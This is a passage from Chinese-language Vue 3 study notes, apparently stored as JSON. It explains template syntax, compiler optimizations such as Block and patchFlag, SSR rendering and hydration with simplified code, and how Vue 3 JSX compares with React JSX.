如果你已经比较熟悉 Node.js 和构建工具等概念，还可以直接在浏览器中打开 [StackBlitz](https://vite.new/vue) 来尝试完整的构建设置。\n\n### 1.5. 类似于 unpkg 的东西\n\n- [unpkg](https://unpkg.com/)\n- [jsdelivr](https://www.jsdelivr.com/package/npm/vue) 或 [cdnjs](https://cdnjs.com/libraries/vue)\n\n### 1.6. Vue2 与 Vue3 的区别\n\n- Vue 2 在 2023 年底将到达它的截止维护日期\n- vue3 仅支持 IE11及以上。Vue 3 用到了一些 IE11 不支持的现代 JavaScript 特性\n- vue3 只支持 [原生支持 ES2015 的浏览器](https://caniuse.com/es6) ，即 `es6`\n\n## 2. 应用\n\n1、每个 `Vue` 应用都是通过 [createApp](https://cn.vuejs.org/api/application.html#createapp) 函数创建一个新的 `应用实例`\n\n2、根组件\n\n![image.png|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/b88a5a4d2277eff8f27cf31541ea7c84.png)\n\n3、挂载应用\n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/e83ae5da762a1f626745c2bb063513cf.png)\n\n4、应用配置\n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/8a51b48b1e5e8ea2fd9d5590b63f12f0.png)\n\n5、多个应用实例\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/06eaeda3dcc927c55c1c786a078866da.png)\n\n## 3. 模板语法\n\n1、`{{}}`\n\n![image.png|496](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/348842d7954689c3fdb16c1a8c0f0cad.png)\n\n2、rawHtml 与 `v-html` 指令\n\n![image.png|520](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/5968a47d4e873e246b2520f15634070f.png)\n\n3、`v-bind:attrName` 与 简写`:attrName` 或 `v-bind:obj` 动态绑定多个值\n\n![image.png|496](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/26f05e6dfe25ed256f0eee99069f2010.png)\n\n简写： `:attrName`\n\n![image.png|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/50c1241f3a8803a2f5b58996c011aeea.png)\n\n![image.png|432](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/acf06258899c4d73a70ae439342aef61.png)\n\n4、`{{}}` 仅支持`表达式`，不支持`语句`\n\n![image.png|488](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/1ebe8a98b79792c966d3a75d935365ad.png)\n\n5、受限的全局访问，可以通过 [app.config.globalProperties](https://cn.vuejs.org/api/application.html#app-config-globalproperties) 配置\n\n- 模板中的表达式将被`沙盒化`，仅能够访问到[有限的全局对象列表](https://github.com/vuejs/core/blob/main/packages/shared/src/globalsWhitelist.ts#L3)。\n- 该列表中会暴露常用的内置全局对象，比如 `Math` 和 `Date`。\n\n```javascript\nimport { makeMap } from './makeMap'\n\nconst GLOBALS_WHITE_LISTED =\n  'Infinity,undefined,NaN,isFinite,isNaN,parseFloat,parseInt,decodeURI,' +\n  'decodeURIComponent,encodeURI,encodeURIComponent,Math,Number,Date,Array,' +\n  'Object,Boolean,String,RegExp,Map,Set,JSON,Intl,BigInt'\n\nexport const isGloballyWhitelisted = /*#__PURE__*/ makeMap(GLOBALS_WHITE_LISTED)\n```\n\n没有显式包含在列表中的全局对象将不能在模板内表达式中访问，例如用户附加在 window 上的属性。\n\n> 你也可以自行在 [app.config.globalProperties](https://cn.vuejs.org/api/application.html#app-config-globalproperties) 上 显式地添加它们，供所有的 Vue 表达式使用。\n\n## 4. 指令 Directives\n\n1、`v-on` 有一个相应的缩写，即 `@` 字符 ， 如 `@click <=> v-on:click`\n\n2、`v-bind:href` 等价于 `:href` \n\n3、**动态参数**的说明如下\n- 动态属性\n- 动态事件名称\n- 动态参数值的限制：为null 或者 字符串，否则编译警告\n- 动态参数的语法限制：大小写，注意空格等\n\n具体看下面：\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/0c3f6bbe4333afb3a4d663b954c16887.png)\n\n动态参数的语法限制：\n\n![image.png|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/53bf37f4be201240faf16a9c33191c14.png)\n\n4、指令的修饰符\n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/9f6397816b7d01663f22e57bbc383a36.png)\n\n","dAzaS6pf":"\n# Vue3 的编译器原理（篇三：编译优化）\n\n\n `#vue` `#vue3` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- `渲染器`能够得到`编译`器的一些**额外信息**，所以虚拟 DOM 会产生额外的开销\n\t- 比如，静态节点\n\t- 所以，`vue.js 3 的编译器`会充分分析模板，提取==关键信息==并将其附着到对应的==虚拟节点==上\n- 编译优化的核心在于，区分**动态节点与静态节点**。\n\t- Vue.js 3 会为`动态节点`打上补丁标志，即 `patchFlag`\n- ==静态提升== →  可以理解为（将静态 HTML 内容提取为变量）\n\t- 能够减少更新时创建虚拟 DOM 带来的性能开销和内存占用\n\t\t- ==①== 静态提升的 props\n\t\t\t- hoist-props\n\t\t- ==②== 静态提升的 vnode 节点\n\t\t\t- hoist-vnode\n\t\t- ③ 静态提升`静态字符串`\n\t\t\t- hoist-html-string\n- ==缓存==内联事件处理函数\n- v-once\n\t- cache\n\t\t- `虚拟DOM` 被缓存了，所以更新时无须重新创建\n\n## 1. 传统 Diff 算法的问题\n\n![图片&文件](./files/20241104-32.png)\n\n为什么虚拟 DOM 会产生额外的性能开销呢?\n- 根本原因在于，**渲染器在运行时得不到足够的信息**。\n\t- 传统 Diff 算法无法利用编译时提取到的任何关键信息，这导致渲染器在运行时不可能去做相关的优化\n\n## 2. 解决方案：编译优化\n\n- 编译优化指的是通过编译的手段提取`关键信息`，并以此指导生成最优代码的过程。\n- 具体来说，Vue.js 3 的编译器会充分分析模板，提取关键信息并将其附着到对应的虚拟节点上。\n- 在运行时阶段，渲染器通过这些`关键信息`执行 “**快捷路径**” ，从而提升性能。\n\n### 2.1. Block 和 PatchFlags\n\n![图片&文件](./files/20241105.png)\n\n- 观察上面的 `vnode 对象`可以发现，与普通虚拟节点相比，它多出了一个额外的 `dynamicChildren` 属性。\n- 我们把带有该属性的虚拟节点称为“块”， 即 `Block`。\n\t- 所以，一个 Block `本质上`也是一个虚拟 DOM 节点\n\t\t- 只不过它比普通的虚拟节点多出来一个用来==存储动态子节点==的 `dynamicChildren` 属性。\n\n这里需要注意的是，一个 Block 不仅能够收集它的直接动态子节点，还能够收集所有`动态子孙节点`。\n\n渲染器的更新操作将会以 Block 为维度。也就是说，当渲染器在更新一个 Block 时，会忽略虚拟节点的 children 数组，而是直接找到该虚拟节点的 `dynamicChildren 数组`，并只更新该数组中的动态节点。这样，在更新时就实现了跳过静态内容，只更新动态内容。\n\n同时，由于动态节点中存在对应的补丁标志，所以在更新动态节点的时候，也能够做到**靶向更新**。\n- 例如，当一 个动态节点的 `patchFlag` 值为数字 1 时，我们知道它只存在动态的文本节点，所以只需要更新它的文本内容即可\n\n![图片&文件](./files/20241105-1.png)\n\n### 2.2. 收集动态节点\n\n在编译器生成的渲染函数代码中，**并不会直接包含用来描述虚拟节点的数据结构，而是包含着用来创建虚拟 DOM 节点的辅助函数**\n\n![图片&文件](./files/20241105-3.png)\n\n`createBlock` 函数及 `createVNode` 代码如下：\n\n```javascript\nfunction createVNode(tag, props, children, flags) {\n  const key = props && props.key;\n\n  // 为什么要删除 key 属性呢？\n  // 因为 key 属性是用来做虚拟节点的唯一标识的，不应该被挂载到 props 上\n  props && delete props.key;\n\n  const vnode = {\n    tag,\n    props,\n    children,\n    key,\n    flags,\n  };\n\n  if (typeof flags !== \"undefined\" && currentDynamicChildren) {\n    // 动态节点\n    currentDynamicChildren.push(vnode);\n  }\n\n  return vnode;\n}\n\n// 动态节点栈\nconst dynamicChildrenStack = [];\n// 当前动态节点集合\nlet currentDynamicChildren = null;\n// openBlock 用来创建一个新的动态节点集合，并将该集合压入栈中\nfunction openBlock() {\n  dynamicChildrenStack.push((currentDynamicChildren = []));\n}\n// closeBlock 用来将通过 openBlock 创建的动弹节点集合从栈中弹出\nfunction closeBlock() {\n  currentDynamicChildren = dynamicChildrenStack.pop();\n}\n\nfunction createBlock(tag, props, children) {\n  const block = createVNode(tag, props, children);\n  block.dynamicChildren = currentDynamicChildren;\n\n  closeBlock();\n\n  return block;\n}\n\n```\n\n运行看效果\n\n```javascript hl:8,10\nconst block =\n  (openBlock(),\n  createBlock(\"div\", null, [\n    createVNode(\"p\", { class: \"foo\" }, null, 1),\n    createVNode(\"p\", { class: \"bar\" }, null),\n  ]));\n\nconsole.log(block);\n\n// output：\nconst vdom = {\n  tag: \"div\",\n  props: null,\n  children: [\n    {\n      tag: \"p\",\n      props: {\n        class: \"foo\",\n      },\n      children: null,\n      flags: 1,\n    },\n    {\n      tag: \"p\",\n      props: {\n        class: \"bar\",\n      },\n      children: null,\n    },\n  ],\n  key: null,\n  dynamicChildren: [\n    {\n      tag: \"p\",\n      props: {\n        class: \"foo\",\n      },\n      children: null,\n      flags: 1,\n    },\n  ],\n};\n```\n\n以上 block 或者 vdom 可以直接给 render 函数\n\n```javascript\n// render() {\n//   return createVNode('div', {}, [\n//     createVNode('div', {}, [\n//       createVNode('div', {}, [\n//         createVNode('div', {}, [\n//           createVNode('div', {}, [\n//             // ...\n//           ])\n//         ])\n//       ])\n//     ])\n//   ])\n// }\n```\n \n\n### 2.3. 渲染器的运行时支持\n\n现在，我们已经有了动态节点集合 `vnode.dynamicChildren`， 以及附着其上的补丁标志。基于这两点，即可在渲染器中实现**靶向更新**。\n\n![图片&文件](./files/20241105-4.png)\n\n### 2.4. 总结\n\n- 编译优化的核心在于，区分**动态节点与静态节点**。\n\t- Vue.js 3 会为`动态节点`打上补丁标志，即 `patchFlag`。\n- 同时，Vue.js 3 还提出了 Block 的概念，一个 Block 本质上也是一个虚拟节点，但与普通虚拟节点相比，会多出一个 `dynamicChildren` 数组。\n- 该数组用来收集所有动态子代节点\n\t- 这利用了 `createVNode` 函数和 createBlock 函数的层层嵌套调用的特点，\n\t\t- 即以“由内向外”的方式执行。再配合一个 用来临时存储动态节点的节点栈，即可完成**动态子代节点**的收集。\n\n## 3. Block 树\n\n### 3.1. v-if 的问题：使用 key \n\n![图片&文件](./files/20241105-5.png)\n\n解决方案：\n\n![图片&文件](./files/20241105-6.png)\n\n### 3.2. v-for 的解决方案： 让 v-for 的指令也作为 block\n\n![图片&文件](./files/20241105-7.png)\n\n### 3.3. Fragment 的稳定性与不稳定\n\n![图片&文件](./files/20241105-8.png)\n\n### 3.4. 总结\n\n- 由于 Block 会收集所有动态子代节点，所以对动态节点的比对操作是忽略 DOM 层级结构的。\n- 这会带来额外的问题，\n\t- 即 **v-if、v-for 等结构化指令会影响 DOM 层级结构，使之不稳定。这会间接导致基于 Block 树的比对算法失效**。\n\n而解决方式很简单，只需要让带有 v-if、v-for 等指令的节点也作为 Block 角色即可。\n\n## 4. 静态提升\n\n静态提升: 能够减少更新时创建虚拟 DOM 带来的性能开销和内存占用。\n\n### 4.1. 静态提升静态虚拟节点\n\n![图片&文件](./files/20241105-11.png)\n\n### 4.2. 静态提升静态属性\n\n![图片&文件](./files/20241105-9.png)\n\n## 5. 预字符串化：静态提升静态字符串\n\n预字符串化: 在静态提升的基础上，对静态节点进行字符串化。 这样做能够减少创建虚拟节点产生的性能开销以及内存占用。\n\n![图片&文件](./files/20241105-10.png)\n\n## 6. 缓存内联事件处理函数\n\n避免造成不必要的组件更新\n\n![图片&文件](./files/20241105-12.png)\n\n## 7. v-once 指令：缓存全部或部分虚拟节点\n\n缓存全部或部分虚拟节点，能够避免组件更新时重新创建虚拟 DOM 带来的性能开销，也可以避免无用的 Diff 操作。\n\n当编译器遇到 `v-once 指令`时，会利用我们上一节介绍的 `cache 数组`来缓存`渲染函数的全部或者部分执行结果`，如下图\n\n![图片&文件](./files/20241105-13.png)\n\n实际上，`v-once 指令`能够从两个方面提升性能。\n- 避免组件更新时重新创建虚拟 DOM 带来的性能开销。\n\t- 因为`虚拟 DOM` 被缓存了，所以更新时无须重新创建。\n- 避免无用的 Diff 开销。这是因为被 `v-once 标记`的虚拟 DOM 树不会被父级 Block 节点收集。\n\n","hpPXH5R4":"\n# Vue3 的服务端渲染（SSR）原理（同构原理）\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- `ssr` 简单说就是把 `vdom` 渲染成 HTML 字符串\n- 客户端激活原理：需要干==两件事情==\n\t- 会==递归== 在虚拟节点与真实DOM元素之间建立联系，即 `vnode.el = el`。这样才能保证后续更新程序正确运行。  \n\t- 为 DOM 元素==添加事件绑定==。\n- 激活完成后，整个应用程序已经完全==被 Vue.js 接管为 CSR 应用程序==\n\n## 1. CSR、SSR、同构\n\n![图片&文件](./files/20241104-22.png)\n\n- CSR 和 SSR 如上图\n- 同构 \n\t- 首次渲染与 SSR 的工作流程是一致的\n\t-  激活完成后，整个应用程序已经完全被 Vue.js 接管为 CSR 应用程序了\n\n### 1.1. 渲染对比\n\n![图片&文件](./files/20241104-23.png)\n\n## 2. Vdom 渲染成 HTML 字符串\n\n### 2.1. renderElementVNode：渲染标准的 DOM\n\n```javascript hl:13\n    // 自闭合标签\nconst VOID_TAGS =\n\t\"area,base,br,col,embed,hr,img,input,link,meta,param,source,track,wbr\".split(\n\t\t\",\",\n\t);\nfunction renderElementVNode(vnode) {\n\tconst { type: tag, props, children } = vnode;\n\tconst isVoidElement = VOID_TAGS.includes(tag);\n\t// 开始标签\n\tlet ret = `<${tag}`;\n\t// 属性,考虑属性名称是否合法，还要对属性值进行 HTML 转义\n\tif (props) {\n\t\tret += renderAttrs(props);\n\t}\n\t// 结束标签\n\tret += isVoidElement ? `/>` : `>`;\n\n\t// 如果是自闭合标签, 直接返回\n\tif (isVoidElement) return ret;\n\n\t// 子节点: 说明是文本节点，直接拼接\n\tif (typeof children === \"string\") {\n\t\tret += children;\n\t\t// 子节点: 说明是数组，递归渲染 , 拼接\n\t} else {\n\t\tchildren.forEach((child) => {\n\t\t\tret += renderElementVNode(child);\n\t\t});\n\t}\n\n\t// 走到这里说明是普通标签，需要闭合\n\tret += `</${tag}>`;\n\n\t// 返回拼接好的字符串\n\treturn ret;\n}\n```\n\n### 2.2. renderAttrs\n\n```javascript hl:16,48\nconst shouldIgnoreProp = [\"key\", \"ref\"];\n\n// 渲染属性：属性名是否合法，是否是动态属性，属性值是否需要转义\nfunction renderAttrs(props) {\n\tlet ret = \"\";\n\tfor (const key in props) {\n\t\tif (shouldIgnoreProp.includes(key) || /^on[^a-z]/.test(key)) {\n\t\t\tcontinue;\n\t\t}\n\t\tconst value = props[key];\n\t\tif (key === \"class\") {\n\t\t\t// ret += ` class=\"${renderClass(value)}\"`\n\t\t} else if (key === \"style\") {\n\t\t\t// ret += ` style=\"${renderStyle(value)}\"`\n\t\t} else {\n\t\t\tret += renderDynamicAttr(key, value);\n\t\t}\n\t}\n\treturn ret;\n}\n\nfunction isRenderableValue(value) {\n\tif (value == null) {\n\t\treturn false;\n\t}\n\tconst type = typeof value;\n\treturn type === \"string\" || type === \"number\" || type === \"boolean\";\n}\n\nconst isBooleanAttr = (key) =>\n\t(\n\t\t`itemscope,allowfullscreen,formnovalidate,ismap,nomodule,novalidate,readonly` +\n\t\t`,async,autofocus,autoplay,controls,default,defer,disabled,hidden,` +\n\t\t`loop,open,required,reversed,scoped,seamless,` +\n\t\t`checked,muted,multiple,selected`\n\t)\n\t\t.split(\",\")\n\t\t.includes(key);\nconst isSSRSafeAttrName = (key) => true;\n\nfunction renderDynamicAttr(key, value) {\n\tif (!isRenderableValue(value)) {\n\t\treturn ``;\n\t}\n\tif (isBooleanAttr(key)) {\n\t\treturn value === false ? `` : ` ${key}`;\n\t} else if (isSSRSafeAttrName(key)) {\n\t\treturn value === \"\" ? ` ${key}` : ` ${key}=\"${escapeHtml(value)}\"`;\n\t} else {\n\t\tconsole.warn(\n\t\t\t`[@vue/server-renderer] Skipped rendering unsafe attribute name: ${key}`,\n\t\t);\n\t\treturn ``;\n\t}\n}\n```\n\n### 2.3. escapeHtml\n\n不展开了\n\n## 3. Vue 组件渲染成 HTML 字符串\n\n比如自定义组件 `MyComponent`，如下：\n\n```javascript\nconst MyComponent = {\n\tname: \"App\",\n\tsetup() {\n\t\tconst str = ref(\"foo\");\n\t\treturn () => {\n\t\t\treturn {\n\t\t\t\ttype: \"div\",\n\t\t\t\tchildren: [\n\t\t\t\t\t{\n\t\t\t\t\t\ttype: \"span\",\n\t\t\t\t\t\tchildren: str.value,\n\t\t\t\t\t\tprops: {\n\t\t\t\t\t\t\tonClick: () => {\n\t\t\t\t\t\t\t\tstr.value = \"bar\";\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t\t{ type: \"span\", children: \"baz\" },\n\t\t\t\t],\n\t\t\t};\n\t\t};\n\t},\n};\n\nconst compVNode = {\n\ttype: MyComponent,\n};\n```\n\n详细代码\n\n```javascript hl:26,24,107,116,118\nfunction renderComponentVNode(vnode) {\n\tconst isFunctional = typeof vnode.type === \"function\";\n\tlet componentOptions = vnode.type;\n\tif (isFunctional) {\n\t\tcomponentOptions = {\n\t\t\trender: vnode.type,\n\t\t\tprops: vnode.type.props,\n\t\t};\n\t}\n\tlet {\n\t\trender,\n\t\tdata,\n\t\tsetup,\n\t\tbeforeCreate,\n\t\tcreated,\n\t\tbeforeMount,\n\t\tmounted,\n\t\tbeforeUpdate,\n\t\tupdated,\n\t\tprops: propsOption,\n\t} = componentOptions;\n\n\t// 生命周期钩子\n\tbeforeCreate && beforeCreate();\n\n\t// 不需要转成响应式数据，服务端渲染不需要\n\tconst state = data ? data() : null;\n\tconst [props, attrs] = resolveProps(propsOption, vnode.props);\n\n\tconst slots = vnode.children || {};\n\n\tconst instance = {\n\t\tstate,\n\t\tprops,\n\t\tisMounted: false,\n\t\tsubTree: null,\n\t\tslots,\n\t\tmounted: [],\n\t\tkeepAliveCtx: null,\n\t};\n\n\tfunction emit(event, ...payload) {\n\t\tconst eventName = `on${event[0].toUpperCase() + event.slice(1)}`;\n\t\tconst handler = instance.props[eventName];\n\t\tif (handler) {\n\t\t\thandler(...payload);\n\t\t} else {\n\t\t\tconsole.error(\"事件不存在\");\n\t\t}\n\t}\n\n\t// setup\n\tlet setupState = null;\n\tif (setup) {\n\t\tconst setupContext = { attrs, emit, slots };\n\t\tconst prevInstance = setCurrentInstance(instance);\n\t\tconst setupResult = setup(\n\t\t\tshallowReadonly(instance.props),\n\t\t\tsetupContext,\n\t\t);\n\t\tsetCurrentInstance(prevInstance);\n\t\tif (typeof setupResult === \"function\") {\n\t\t\tif (render)\n\t\t\t\tconsole.error(\n\t\t\t\t\t\"setup 函数返回渲染函数，render 选项将被忽略\",\n\t\t\t\t);\n\t\t\trender = setupResult;\n\t\t} else {\n\t\t\tsetupState = setupContext;\n\t\t}\n\t}\n\n\tvnode.component = instance;\n\n\tconst renderContext = new Proxy(instance, {\n\t\tget(t, k, r) {\n\t\t\tconst { state, props, slots } = t;\n\n\t\t\tif (k === \"$slots\") return slots;\n\n\t\t\tif (state && k in state) {\n\t\t\t\treturn state[k];\n\t\t\t} else if (k in props) {\n\t\t\t\treturn props[k];\n\t\t\t} else if (setupState && k in setupState) {\n\t\t\t\treturn setupState[k];\n\t\t\t} else {\n\t\t\t\tconsole.error(\"不存在\");\n\t\t\t}\n\t\t},\n\t\tset(t, k, v, r) {\n\t\t\tconst { state, props } = t;\n\t\t\tif (state && k in state) {\n\t\t\t\tstate[k] = v;\n\t\t\t} else if (k in props) {\n\t\t\t\tprops[k] = v;\n\t\t\t} else if (setupState && k in setupState) {\n\t\t\t\tsetupState[k] = v;\n\t\t\t} else {\n\t\t\t\tconsole.error(\"不存在\");\n\t\t\t}\n\t\t},\n\t});\n\n\t// created\n\tcreated && created.call(renderContext);\n\t// 执行 render 得到 subTree，即组件要渲染的内容\n\tconst subTree = render.call(renderContext, renderContext);\n\n\treturn renderVNode(subTree);\n}\n\nfunction renderVNode(vnode) {\n\tconst type = typeof vnode.type;\n\tif (type === \"string\") {\n\t\treturn renderElementVNode(vnode);\n\t} else if (type === \"object\" || type === \"function\") {\n\t\treturn renderComponentVNode(vnode);\n\t} else if (vnode.type === Text) {\n\t\t// 处理文本...\n\t} else if (vnode.type === Fragment) {\n\t\t// 处理片段...\n\t} else {\n\t\t// 其他 VNode 类型\n\t}\n}\n```\n\n### 3.1. 两种渲染初始化的对比\n\n![图片&文件](./files/20241104-24.png)\n\n## 4. 客户端激活的原理\n\n- 在同构渲染过程中，组件的代码会分别在服务端和浏览器中执行一次。\n\t- 在服务端，组件会被渲染为静态的 HTML 字符串，并发送给浏览器。\n\t- 浏览器则会渲染由服务端返回的静态的 HTML 内容，并下载打包在静态资源中的组件代码。 当下载完毕后，浏览器会解释并执行该组件代码。\n\t- 当组件代码在客户端执行时，由于页面中已经存在对应的 DOM 元素，\n\t\t- 所以渲染器并不会执行创建 DOM 元素的逻辑，而是会执行`激活`操作。\n- **激活操作可以总结为两个步骤**。\n\t- 在虚拟节点与真实DOM元素之间建立联系，即 `vnode.el = el`。这样才能保证后续更新程序正确运行。  \n\t- 为 DOM 元素添加事件绑定。\n\n主要代码如下\n\n```javascript hl:3,12,15,18,25,31\n// 激活 客户端渲染，水合\nfunction hydrate(vnode, container) {\n\thydrateNode(container.firstChild, vnode);\n}\n\nfunction hydrateNode(node, vnode) {\n\tconst { type } = vnode;\n\tvnode.el = node;\n\n\t// 如果是组件, 则调用 mountComponent 完成激活\n\tif (typeof type === \"object\") {\n\t\tmountComponent(vnode, container, null);\n\t\t// 如果是真实的 DOM 元素，需要和 vnode 进行水合\n\t} else if (typeof type === \"string\") {\n\t\thydrateElement(node, vnode);\n\t}\n\n\t// 返回下一个节点, 用于下次激活操作\n\treturn node.nextSibling;\n}\n\nfunction hydrateElement(el, vnode) {\n\tif (vnode.props) {\n\t\tfor (const key in vnode.props) {\n\t\t\t// 只有事件属性才需要进行水合（激活）\n\t\t\tif (/^on/.test(key)) {\n\t\t\t\tpatchProps(el, key, null, vnode.props[key]);\n\t\t\t}\n\t\t}\n\t}\n\t// 递归激活子节点\n\tif (Array.isArray(vnode.children)) {\n\t\tlet nextNode = el.firstChild;\n\t\tconst len = vnode.children.length;\n\t\tfor (let i = 0; i < len; i++) {\n\t\t\tnextNode = hydrateNode(nextNode, vnode.children[i]);\n\t\t}\n\t}\n}\n```\n\n`mountComponent` 需要特殊处理下，如下\n \n![图片&文件](./files/20241104-25.png)\n\n## 5. 编写同构代码的注意事项\n\n### 5.1. 生命周期\n\nbeforeUpdate、updated、 beforeMount、mounted、beforeUnmount、unmounted 等生命周期钩子函数不会在服务端执行。  \n\n- 与 DOM 相关的钩子函数都不会在服务端执行\n\n比如下面的代码node 端会出内存泄漏问题\n\n![图片&文件](./files/20241104-26.png)\n\n解决方案，两个，如下图\n\n![图片&文件](./files/20241104-27.png)\n\n### 5.2. 使用跨平台的 API\n\n- 由于组件的代码既要在浏览器中运行，也要在服务器中运行，所以编写组件代码时，要额外注意代码的跨平台性。\n- 通常我们在选择第三方库的时候，会选择支持`跨平台的库`， 例如使用 `Axios` 作为网络请求库。\n\n### 5.3. 只在某一端引入模块\n\n特定端的实现。无论在客户端还是在服务端，都应该保证功能的一致性。\n\n例如，组件需要读取 cookie 信息。\n- 在客户端，我们可以 通过 document.cookie 来实现读取;\n- 而在服务端，则需要根据请求头来实现读取。所以，很多功能模块需要我们为客户端和服务端分别实现。 \n\n比如\n\n![图片&文件](./files/20241104-28.png)\n\n### 5.4. 避免交叉请求引起的状态污染\n\n状态污染既可以是应用级的，也可以是模块级的。\n- 对于应用，我们应该为每一个请求创建一个独立的应用实例。\n\t- ![图片&文件](./files/20241104-29.png)\n- 对于模块，我们应该避免使用模块级的全局变量。这是因为在不做特殊处理的情况下，多个请求会共用模块级的全局变量，造成请求间的交叉污染。因为服务器与用 户是一对多的关系，下图，造成了 `count` 的污染\n\t- ![图片&文件](./files/20241104-30.png)\n\n### 5.5. ClientOnly\n\n 仅在客户端渲染组件中的部分内容。这需要我们自行封装 `<ClientOnly>` 组件，被该组件包裹的内容仅在客户端才会被渲 染。\n \n![520](#)","maNyoMBr":"\n# Vue3 中可使用 JSX 原理\n\n\n`#vue` `#jsx` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\nVue 3 中支持使用 JSX 的原理涉及到==编译过程和运行时==的配合\n- 编译过程将 JSX 转换为 ==Vue 的渲染函数==调用\n- 而运行时则通过 `h 函数`创建虚拟 DOM。\n- 这种方式既保留了 JSX 的灵活性，又充分利用了 Vue 的响应式系统和组件模型\n\n## 1. 编译原理\n\nJSX 在 Vue 3 中的使用需要通过编译步骤将 JSX 语法转换为 Vue 的渲染函数。这个过程主要依赖于 Babel 插件，特别是 `@vue/babel-plugin-jsx`。\n\n编译过程大致如下：\n\n### 1.1. 解析 JSX\n\nBabel 首先将 JSX 代码解析成抽象语法树（AST）。\n\n### 1.2. 转换\n\n==@vue/babel-plugin-jsx 插件==会遍历 AST，将 JSX 节点转换为对应的 Vue 3 渲染函数调用。\n\n### 1.3. 生成代码\n\n最后，Babel 根据转换后的 AST 生成 JavaScript 代码。\n\n## 2. 运行时原理\n\n在运行时，Vue 3 使用 `h 函数`（createElement 的简写）来创建虚拟 DOM 节点。JSX 编译后的代码本质上就是一系列 h 函数的调用。\n\n例如，下面的 JSX：\n\n```jsx\nconst App = () => (\n  <div>\n    <h1>Hello, Vue 3!</h1>\n    <p>{message}</p>\n  </div>\n);\n```\n\n会被编译成类似这样的代码：\n\n```javascript\nimport { h } from 'vue';\n\nconst App = () => h('div', null, [\n  h('h1', null, 'Hello, Vue 3!'),\n  h('p', null, message)\n]);\n```\n\n## 3. 与 Vue 组件系统的集成\n\nVue 3 的组件系统能够无缝地与 JSX 集成，主要通过以下方式：\n\n### 3.1. 属性传递\n\nJSX 中的属性会被转换为 h 函数的第二个参数，对应于组件的 props。\n\n### 3.2. 事件处理\n\nJSX 中的事件处理器（如 onClick）会被转换为 Vue 的事件监听器。\n\n### 3.3. 插槽\n\nJSX 允许直接传递子元素，这些会被转换为`默认插槽`或`具名插槽`。\n\n## 4. 响应式整合\n\nVue 3 的组合式 API（Composition API）与 JSX 配合得很好。你可以在 JSX 中直接使用 ref、computed 等响应式 API。\n\n```jsx\nimport { ref, computed } from 'vue';\n\nconst MyComponent = () => {\n  const count = ref(0);\n  const doubleCount = computed(() => count.value * 2);\n\n  return () => (\n    <div>\n      <p>Count: {count.value}</p>\n      <p>Double: {doubleCount.value}</p>\n      <button onClick={() => count.value++}>Increment</button>\n    </div>\n  );\n};\n```\n\n## 5. 性能优化：编译优化\n\nVue 3 的编译器能够对 JSX 进行静态分析和优化，例如：\n\n- 静态提升：\n\t- 将不变的内容提升到渲染函数之外。\n- 补丁标记：\n\t- 为动态内容添加标记，以优化更新过程。\n\n## 6. Vue3 的JSX 和 React 的JSX在各个层面的区别\n\n### 6.1. 语法层面的区别\n\n#### 6.1.1. v-model 的处理\n\n- React中没有v-model概念，需要手动处理：\n```jsx\n<input \n  value={value} \n  onChange={e => setValue(e.target.value)} \n/>\n```\n- Vue JSX中可以使用v-model：\n```jsx\n<input v-model={value} />\n// 或者使用更原生的方式\n<input \n  value={value} \n  onInput={e => value.value = e.target.value} \n/>\n```\n\n#### 6.1.2. 属性传递\n\n- React JSX:\n```jsx\n<Component prop={value} />\n```\n- Vue JSX:\n```jsx\n<Component prop={value} />\n// 也支持v-bind语法\n<Component {...props} />\n```\n\n### 6.2. 组件定义方式的区别\n\nReact组件定义：\n\n```jsx\n// 函数组件\nfunction MyComponent(props) {\n  return <div>{props.text}</div>\n}\n\n// Class组件\nclass MyComponent extends React.Component {\n  render() {\n    return <div>{this.props.text}</div>\n  }\n}\n```\n\nVue3组件定义：\n\n```jsx\n// 使用defineComponent\nimport { defineComponent } from 'vue'\n\nexport default defineComponent({\n  props: {\n    text: String\n  },\n  setup(props) {\n    return () => <div>{props.text}</div>\n  }\n})\n\n// 或者直接使用函数式组件\nconst MyComponent = (props) => {\n  return () => <div>{props.text}</div>\n}\n```\n\n### 6.3. 状态管理的区别\n\nReact中的状态管理：\n\n```jsx\nfunction Component() {\n  const [count, setCount] = useState(0)\n  return <div onClick={() => setCount(count + 1)}>{count}</div>\n}\n```\n\nVue3中的状态管理：\n\n```jsx\nimport { ref } from 'vue'\n\nconst Component = defineComponent({\n  setup() {\n    const count = ref(0)\n    return () => (\n      <div onClick={() => count.value++}>{count.value}</div>\n    )\n  }\n})\n```\n\n### 6.4. 原理层面的区别\n\n#### 6.4.1. 编译时差异\n\n- React JSX 会被编译成 `React.createElement()` 调用\n- Vue JSX 会被编译成 `h()` 函数调用（`createVNode`）\n\n#### 6.4.2. 更新机制\n\n- React 采用虚拟DOM diff算法，当状态改变时会重新执行整个组件函数\n- Vue3 采用响应式系统，只有依赖发生变化的部分才会重新渲染\n\n#### 6.4.3. 属性处理\n\n- React **将所有属性都统一处理为 props**\n- Vue **区分了props、attrs、events等不同类型的属性**\n\n#### 6.4.4. 特有功能支持\n\nVue 特有的功能在 JSX 中的使用：\n\n- 插槽（slots）\n```jsx\n// Vue JSX\nconst MyComponent = {\n  setup(props, { slots }) {\n    return () => (\n      <div>\n        {slots.default?.()}\n        {slots.named?.()}\n      </div>\n    )\n  }\n}\n```\n\n- 指令\n```jsx\n// Vue JSX\n<div v-show={isShow}>Content</div>\n```\n\nReact特有的功能：\n\n- Fragments\n```jsx\n// React\n<>\n  <div>1</div>\n  <div>2</div>\n</>\n\n// Vue3 JSX也支持\n<>\n  